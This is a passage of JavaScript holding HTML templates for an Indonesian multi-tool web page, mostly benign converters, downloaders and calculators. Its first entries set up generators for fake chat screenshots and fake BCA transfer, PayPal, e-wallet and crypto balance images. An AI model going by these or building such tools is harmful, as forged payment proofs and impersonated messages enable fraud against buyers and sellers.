        faketelegram:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Telegram</h2><input id="tg-name" placeholder="Nama Target..."><input id="tg-msg" placeholder="Isi Pesan..."><div class="btn-row"><button onclick="genFakeTelegram()">Generate</button></div><div id="faketelegram-result" style="display:none;text-align:center;margin-top:16px"><img id="faketelegram-img" style="width:100%;border-radius:8px"><a id="faketelegram-dl" download="FakeTelegram.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakegoogle:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Google</h2><input id="g-query" placeholder="Kata kunci..."><div class="btn-row"><button onclick="genFakeGoogle()">Generate</button></div><div id="fakegoogle-result" style="display:none;text-align:center;margin-top:16px"><img id="fakegoogle-img" style="width:100%;border-radius:8px"><a id="fakegoogle-dl" download="FakeGoogle.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakediscord:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Discord</h2><input id="dc-name" placeholder="Nama Target..."><input id="dc-msg" placeholder="Isi Pesan..."><div class="btn-row"><button onclick="genFakeDiscord()">Generate</button></div><div id="fakediscord-result" style="display:none;text-align:center;margin-top:16px"><img id="fakediscord-img" style="width:100%;border-radius:8px"><a id="fakediscord-dl" download="FakeDiscord.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakebca:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake BCA</h2><input id="bca-target" placeholder="Nama Penerima..."><input id="bca-amount" placeholder="Nominal (1.000.000)"><div class="btn-row"><button onclick="genFakeBca()">Generate</button></div><div id="fakebca-result" style="display:none;text-align:center;margin-top:16px"><img id="fakebca-img" style="width:100%;border-radius:8px"><a id="fakebca-dl" download="FakeBCA.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        dana:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake DANA</h2><input id="dana-merchant" placeholder="Merchant"><input id="dana-total" placeholder="Total"><div class="btn-row"><button onclick="genDana()">Generate</button></div><div id="dana-result" style="display:none;text-align:center;margin-top:16px"><img id="dana-img" style="width:100%;max-width:250px;border-radius:8px"><a id="dana-dl" download="Dana.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakeigprofile:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake IG Profile</h2><input id="igp-name" placeholder="Username IG"><div class="btn-row"><button onclick="genFakeIgProfile()">Generate</button></div><div id="fakeigprofile-result" style="display:none;text-align:center;margin-top:16px"><img id="fakeigprofile-img" style="width:100%;border-radius:8px"><a id="fakeigprofile-dl" download="FakeIG.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        faketweet:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Tweet</h2><input id="ft-name" placeholder="Username..."><input id="ft-msg" placeholder="Isi Tweet..."><div class="btn-row"><button onclick="genFakeTweet()">Generate</button></div><div id="faketweet-result" style="display:none;text-align:center;margin-top:16px"><img id="faketweet-img" style="width:100%;border-radius:8px"><a id="faketweet-dl" download="FakeTweet.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakepaypal:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake PayPal</h2><input id="pp-amount" placeholder="Nominal"><input id="pp-name" placeholder="Nama"><div class="btn-row"><button onclick="genFakePaypal()">Generate</button></div><div id="fakepaypal-result" style="display:none;text-align:center;margin-top:16px"><img id="fakepaypal-img" style="width:100%;border-radius:8px"><a id="fakepaypal-dl" download="FakePayPal.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakeshopee:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Shopee</h2><input id="sp-item" placeholder="Nama Barang..."><input id="sp-price" placeholder="Harga"><div class="btn-row"><button onclick="genFakeShopee()">Generate</button></div><div id="fakeshopee-result" style="display:none;text-align:center;margin-top:16px"><img id="fakeshopee-img" style="width:100%;border-radius:8px"><a id="fakeshopee-dl" download="FakeShopee.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakenetflix:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Netflix</h2><input id="nf-name" placeholder="Nama Profil..."><div class="btn-row"><button onclick="genFakeNetflix()">Generate</button></div><div id="fakenetflix-result" style="display:none;text-align:center;margin-top:16px"><img id="fakenetflix-img" style="width:100%;border-radius:8px"><a id="fakenetflix-dl" download="FakeNetflix.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakespotify:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Spotify</h2><input id="sp-title" placeholder="Judul Lagu"><input id="sp-artist" placeholder="Artis"><div class="btn-row"><button onclick="genFakeSpotify()">Generate</button></div><div id="fakespotify-result" style="display:none;text-align:center;margin-top:16px"><img id="fakespotify-img" style="width:100%;border-radius:8px"><a id="fakespotify-dl" download="FakeSpotify.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakegopay:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake GoPay</h2><input id="gp-bal" placeholder="Saldo"><div class="btn-row"><button onclick="genFakeGopay()">Generate</button></div><div id="fakegopay-result" style="display:none;text-align:center;margin-top:16px"><img id="fakegopay-img" style="width:100%;border-radius:8px"><a id="fakegopay-dl" download="FakeGoPay.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakeovo:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake OVO</h2><input id="ovo-bal" placeholder="Saldo"><div class="btn-row"><button onclick="genFakeOvo()">Generate</button></div><div id="fakeovo-result" style="display:none;text-align:center;margin-top:16px"><img id="fakeovo-img" style="width:100%;border-radius:8px"><a id="fakeovo-dl" download="FakeOVO.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakesteam:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Steam</h2><input id="st-name" placeholder="Nama Steam"><div class="btn-row"><button onclick="genFakeSteam()">Generate</button></div><div id="fakesteam-result" style="display:none;text-align:center;margin-top:16px"><img id="fakesteam-img" style="width:100%;border-radius:8px"><a id="fakesteam-dl" download="FakeSteam.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakecrypto:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Crypto</h2><input id="crypto-bal" placeholder="Saldo"><input id="crypto-btc" placeholder="BTC"><div class="btn-row"><button onclick="genFakeCrypto()">Generate</button></div><div id="fakecrypto-result" style="display:none;text-align:center;margin-top:16px"><img id="fakecrypto-img" style="width:100%;border-radius:8px"><a id="fakecrypto-dl" download="FakeCrypto.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakelobbyml:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake ML Lobby</h2><input id="ml-name" placeholder="Nama Player..."><div class="btn-row"><button onclick="genFakeML()">Generate</button></div><div id="fakelobbyml-result" style="display:none;text-align:center;margin-top:16px"><img id="fakelobbyml-img" style="width:100%;border-radius:8px"><a id="fakelobbyml-dl" download="FakeML.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakemlchat:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake ML Chat</h2><input id="mlc-text" placeholder="Isi chat..."><div class="btn-row"><button onclick="genFakeMLChat()">Generate</button></div><div id="fakemlchat-result" style="display:none;text-align:center;margin-top:16px"><img id="fakemlchat-img" style="width:100%;border-radius:8px"><a id="fakemlchat-dl" download="FakeMLChat.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        fakemlprofile:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake ML Profile</h2><input id="mlp-name" placeholder="Nama Player..."><input id="mlp-rank" placeholder="Rank..."><div class="btn-row"><button onclick="genFakeMLProfile()">Generate</button></div><div id="fakemlprofile-result" style="display:none;text-align:center;margin-top:16px"><img id="fakemlprofile-img" style="width:100%;border-radius:8px"><a id="fakemlprofile-dl" download="FakeMLProfile.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        faketerm:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fake Terminal</h2><textarea id="term-in" placeholder="hack" style="height:80px"></textarea><div class="btn-row"><button onclick="runFakeTerm()">Jalankan</button></div><div id="term-res" style="margin-top:16px;background:#000;border:1px solid #00ff00;padding:12px;border-radius:8px;color:#00ff00;font-family:monospace;font-size:12px;min-height:100px"></div>`,
        yt:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>YouTube DL</h2><input id="yt-url" placeholder="Paste Link..."><div class="btn-row"><button onclick="dlVideo('yt-url','mp4')">MP4</button><button onclick="dlVideo('yt-url','mp3')">MP3</button></div>`,
        tiktok:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>TikTok DL</h2><input id="tt-url" placeholder="Paste Link..."><div class="btn-row"><button onclick="dlVideo('tt-url','mp4')">Download</button></div>`,
        ig:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Instagram DL</h2><input id="ig-url" placeholder="Paste Link..."><div class="btn-row"><button onclick="dlVideo('ig-url','mp4')">Download</button></div>`,
        fb:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Facebook DL</h2><input id="fb-url" placeholder="Paste Link..."><div class="btn-row"><button onclick="dlVideo('fb-url','mp4')">Download</button></div>`,
        ewallet:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>E-Wallet QR</h2><select id="ew-type"><option>DANA</option><option>OVO</option><option>GoPay</option></select><input id="ew-name" placeholder="Nama..."><input id="ew-num" placeholder="Nomor HP..."><div class="btn-row"><button onclick="genEw()">Generate</button></div><div id="ew-result" style="display:none;text-align:center;margin-top:16px"><img id="ew-img" style="width:150px;height:150px"><a id="ew-dl" download="ewallet.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        wifi:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>QR WiFi</h2><input id="wifi-ssid" placeholder="Nama WiFi..."><input id="wifi-pass" placeholder="Password..."><div class="btn-row"><button onclick="genWifi()">Generate</button></div><div id="wifi-result" style="display:none;text-align:center;margin-top:16px"><img id="wifi-img" style="width:150px;height:150px"><a id="wifi-dl" download="wifi.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        brat:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>BRAT Gen</h2><input id="brat-text" placeholder="Ketik teks..."><div class="btn-row"><button onclick="genBrat()">Generate</button></div><div id="brat-result" style="display:none;text-align:center;margin-top:16px"><img id="brat-img" style="width:100%;border-radius:8px"><a id="brat-dl" download="brat.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        hdphoto:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Image HD</h2><input type="file" id="hd-file" accept="image/*"><div class="btn-row"><button onclick="processImg('hd')">Proses</button></div><div id="hd-result" style="display:none;text-align:center;margin-top:16px"><img id="hd-img" style="width:100%;border-radius:8px"><a id="hd-dl" download="HD.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        compress:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Compress</h2><input type="file" id="comp-file" accept="image/*"><div class="btn-row"><button onclick="processImg('comp')">Kompres</button></div><div id="comp-result" style="display:none;text-align:center;margin-top:16px"><img id="comp-img" style="width:100%;border-radius:8px"><a id="comp-dl" download="Comp.jpg" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        pdf:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Image→PDF</h2><input type="file" id="pdf-files" accept="image/*" multiple><div class="btn-row"><button onclick="convertPdf()">Buat PDF</button></div>`,
        hash:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Hash Generator</h2><input id="hash-input" placeholder="Ketik teks..."><div class="btn-row"><button onclick="genHash()">GENERATE</button></div><div id="hash-res" style="display:none;margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        b64:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Base64</h2><textarea id="b64-input" placeholder="Ketik teks..." style="height:80px"></textarea><div class="btn-row"><button onclick="processB64('encode')">ENC</button><button onclick="processB64('decode')">DEC</button></div><div id="b64-res" style="display:none;margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        passgen:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Password Gen</h2><input id="pass-len" type="number" value="16"><div class="btn-row"><button onclick="genPass()">Generate</button></div><div id="pass-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        uuidgen:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>UUID Gen</h2><div class="btn-row"><button onclick="doUuid()">Generate</button></div><div id="uuid-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        text2bin:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Text→Bin</h2><textarea id="t2b-in" style="height:80px"></textarea><div class="btn-row"><button onclick="t2b()">Convert</button></div><div id="t2b-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        bin2text:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Bin→Text</h2><textarea id="b2t-in" style="height:80px"></textarea><div class="btn-row"><button onclick="b2t()">Convert</button></div><div id="b2t-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        caseconv:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Case Converter</h2><textarea id="case-in" style="height:80px"></textarea><div class="btn-row"><button onclick="doCase('upper')">UPPER</button><button onclick="doCase('lower')">lower</button><button onclick="doCase('title')">Title</button></div><div id="case-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        randnum:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Random Number</h2><input id="rand-min" type="number" placeholder="Min"><input id="rand-max" type="number" placeholder="Max"><div class="btn-row"><button onclick="genRand()">Generate</button></div><div id="rand-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;font-size:24px;text-align:center"></div>`,
        coinflip:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Coin Flip</h2><div class="btn-row"><button onclick="flipCoin()">Lempar</button></div><div id="coin-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#ffd700;font-size:24px;text-align:center"></div>`,
        diceroll:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Dice Roll</h2><div class="btn-row"><button onclick="rollDice()">Lempar</button></div><div id="dice-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff00;font-size:24px;text-align:center"></div>`,
        wordcount:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Word Count</h2><textarea id="wc-in" style="height:80px" oninput="countWords()"></textarea><div id="wc-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;text-align:center"></div>`,
        textrev:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Text Reverser</h2><textarea id="tr-in" style="height:80px"></textarea><div class="btn-row"><button onclick="revText()">Balik</button></div><div id="tr-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        text2hex:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Text→Hex</h2><textarea id="t2h-in" style="height:80px"></textarea><div class="btn-row"><button onclick="t2h()">Convert</button></div><div id="t2h-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        hex2text:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Hex→Text</h2><textarea id="h2t-in" style="height:80px"></textarea><div class="btn-row"><button onclick="h2t()">Convert</button></div><div id="h2t-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        urlencode:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>URL Encode</h2><textarea id="url-in" style="height:80px"></textarea><div class="btn-row"><button onclick="doUrl('encode')">Encode</button><button onclick="doUrl('decode')">Decode</button></div><div id="url-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        qrtext:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>QR Text</h2><input id="qr-in" placeholder="Teks..."><div class="btn-row"><button onclick="doQrText()">Generate</button></div><div id="qr-result" style="display:none;text-align:center;margin-top:16px"><img id="qr-img" style="width:150px;height:150px"><a id="qr-dl" download="QR.png" style="display:block;margin-top:10px;color:#000;background:var(--accent);padding:10px;border-radius:8px;text-decoration:none;font-weight:bold">Download</a></div>`,
        jsonfmt:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>JSON Format</h2><textarea id="json-in" placeholder='{"a":1}' style="height:80px"></textarea><div class="btn-row"><button onclick="doJsonFmt()">Format</button></div><div id="json-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        b64img:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>B64→Img</h2><textarea id="b64in" placeholder="data:image/png;base64,..." style="height:80px"></textarea><div class="btn-row"><button onclick="doB64Img()">Decode</button></div><div id="b64img-res" style="margin-top:16px;text-align:center"><img id="b64-img" style="width:100%;border-radius:8px;display:none"></div>`,
        imgb64:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Img→B64</h2><input type="file" id="img-in" accept="image/*"><div class="btn-row"><button onclick="doImgB64()">Encode</button></div><div id="img-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        colorpick:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Color Picker</h2><input type="color" id="color-in" style="height:50px;padding:5px"><div class="btn-row"><button onclick="doColorPick()">Pilih</button></div><div id="color-preview" style="margin-top:16px;padding:20px;border-radius:8px;text-align:center;font-weight:bold;color:#000"></div>`,
        lorem:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Lorem Ipsum</h2><div class="btn-row"><button onclick="doLorem()">Generate</button></div><div id="lorem-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        tts:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Text to Speech</h2><textarea id="tts-in" style="height:80px"></textarea><div class="btn-row"><button onclick="doTts()">Bicara</button></div>`,
        mdprev:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>MD Preview</h2><textarea id="md-in" placeholder="# Heading" style="height:80px"></textarea><div class="btn-row"><button onclick="doMdPrev()">Preview</button></div><div id="md-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#fff"></div>`,
        caesar:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Caesar Cipher</h2><textarea id="caesar-in" style="height:80px"></textarea><input id="caesar-shift" type="number" value="3"><div class="btn-row"><button onclick="doCaesar()">Proses</button></div><div id="caesar-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        morse:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Morse Code</h2><textarea id="morse-in" style="height:80px"></textarea><div class="btn-row"><button onclick="doMorse()">Convert</button></div><div id="morse-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        t2ascii:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Text→ASCII</h2><textarea id="t2a-in" style="height:80px"></textarea><div class="btn-row"><button onclick="doT2Ascii()">Convert</button></div><div id="t2a-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        base32:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Base32</h2><textarea id="b32-in" style="height:80px"></textarea><div class="btn-row"><button onclick="doBase32('enc')">ENC</button><button onclick="doBase32('dec')">DEC</button></div><div id="b32-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        ascii2t:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>ASCII→Text</h2><textarea id="a2t-in" placeholder="72 101 108 108 111" style="height:80px"></textarea><div class="btn-row"><button onclick="doAscii2T()">Convert</button></div><div id="a2t-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        hex2rgb:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Hex→RGB</h2><input id="h2r-in" placeholder="#00ff00"><div class="btn-row"><button onclick="doHex2Rgb()">Convert</button></div><div id="h2r-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        aescrypt:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>AES Crypt</h2><textarea id="aes-in" style="height:80px"></textarea><input id="aes-key" placeholder="Kunci..."><div class="btn-row"><button onclick="doAes('enc')">ENC</button><button onclick="doAes('dec')">DEC</button></div><div id="aes-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        md5hash:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>MD5 Hash</h2><input id="md5-in"><div class="btn-row"><button onclick="doMd5()">Hash</button></div><div id="md5-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        calc:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Kalkulator</h2><input id="calc-in" placeholder="5 + 5 * 2"><div class="btn-row"><button onclick="doCalc()">Hitung</button></div><div id="calc-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;font-size:24px;text-align:center"></div>`,
        bmi:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>BMI</h2><input id="bmi-weight" type="number" placeholder="Berat (kg)"><input id="bmi-height" type="number" placeholder="Tinggi (cm)"><div class="btn-row"><button onclick="doBmi()">Cek</button></div><div id="bmi-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;text-align:center"></div>`,
        stopwatch:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Stopwatch</h2><div id="sw-time" style="font-size:36px;text-align:center;color:#00ff88;margin:20px 0">00:00:00</div><div class="btn-row"><button onclick="swStart()">Start</button><button onclick="swStop()">Stop</button><button onclick="swReset()">Reset</button></div>`,
        timestamp:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Unix Timestamp</h2><input id="ts-in" type="number"><div class="btn-row"><button onclick="doTimestamp()">Convert</button></div><div id="ts-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;white-space:pre-line"></div>`,
        agecalc:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Age Calc</h2><input id="ac-dob" type="date"><div class="btn-row"><button onclick="doAge()">Hitung</button></div><div id="ac-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        romannum:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Roman Num</h2><input id="rn-in" type="number"><div class="btn-row"><button onclick="doRoman()">Konversi</button></div><div id="rn-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        fibonacci:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Fibonacci</h2><input id="fb-in" type="number" placeholder="10"><div class="btn-row"><button onclick="doFib()">Generate</button></div><div id="fb-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;word-break:break-all"></div>`,
        primecheck:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Prime</h2><input id="pc-in" type="number"><div class="btn-row"><button onclick="doPrime()">Cek</button></div><div id="pc-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        factorial:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Factorial</h2><input id="ft-in" type="number"><div class="btn-row"><button onclick="doFact()">Hitung</button></div><div id="ft-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        palindrome:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Palindrome</h2><input id="pl-in"><div class="btn-row"><button onclick="doPalin()">Cek</button></div><div id="pl-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        vowelcount:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Vowel</h2><input id="vc-in"><div class="btn-row"><button onclick="doVowel()">Hitung</button></div><div id="vc-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        percentcalc:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Percentage</h2><input id="pc-num" type="number"><input id="pc-pct" type="number"><div class="btn-row"><button onclick="doPercent()">Hitung</button></div><div id="pc-res2" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        tipcalc:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Tip Calc</h2><input id="tc-bill" type="number"><input id="tc-pct" type="number"><input id="tc-people" type="number"><div class="btn-row"><button onclick="doTip()">Hitung</button></div><div id="tc-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;white-space:pre-line"></div>`,
        tempconv:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Temp Conv</h2><input id="tempc-in" type="number"><div class="btn-row"><button onclick="doTemp()">Convert</button></div><div id="tempc-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;white-space:pre-line"></div>`,
        weightconv:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Weight Conv</h2><input id="wc-in" type="number" placeholder="kg"><div class="btn-row"><button onclick="doWeight()">Convert</button></div><div id="weightc-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;white-space:pre-line"></div>`,
        leapyear:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Leap Year</h2><input id="ly-in" type="number"><div class="btn-row"><button onclick="doLeap()">Cek</button></div><div id="ly-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88"></div>`,
        gcdlcm:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>GCD/LCM</h2><input id="gl-1" type="number"><input id="gl-2" type="number"><div class="btn-row"><button onclick="doGcdLcm()">Hitung</button></div><div id="gl-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;white-space:pre-line"></div>`,
        randomcolor:`<i class="fa-solid fa-xmark modal-close" onclick="closeTool()"></i><h2>Rand Color</h2><div class="btn-row"><button onclick="doRandColor()">Generate</button></div><div id="rc-res" style="margin-top:16px;background:#111;padding:12px;border-radius:8px;color:#00ff88;text-align:center;font-size:24px;font-weight:bold"></div>`,
